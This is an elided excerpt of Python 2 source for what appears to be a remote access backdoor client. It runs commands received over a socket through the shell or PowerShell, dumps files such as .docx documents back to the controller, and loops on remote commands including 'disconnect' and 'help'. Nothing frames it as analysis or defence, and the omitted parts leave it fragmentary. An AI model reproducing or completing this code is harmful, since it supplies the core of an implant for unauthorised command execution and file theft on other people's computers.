import subprocess,os,socket,ntpath,pickle,docx,urllib2
...
def shell_execute(execute):
	if execute[:3] == 'cd ':
		...
		try:
			if not powershell:
				result=subprocess.Popen(execute,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			else:
				try:
					result=subprocess.Popen(['powershell.exe',execute],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				except:
...
def dump_file(file_name):
	try:		
		if os.path.isfile(file_name):
			extension=ntpath.basename(file_name).split('.')[-1]
			if extension == 'docx':
				try:
				...
				try:
					...
					try:
						...
						try:
							...
							s.sendall('[-]Error dumping file "'+ntpath.basename(file_name)+'" : '+str(e)+End)
				except Exception as e:
					s.sendall('[-]Error reading "'+file_name+'" : '+str(e)+End)
		else:
			s.sendall('[-]File path/name is not valid'+End)
		...
		while True:
			try:
				...
				if command == 'disconnect':
					...
					s.sendall('[-]Unknown command "'+command+'", run "help" for help menu')
			except:
				s.shutdown(1)
				s.close()
				break
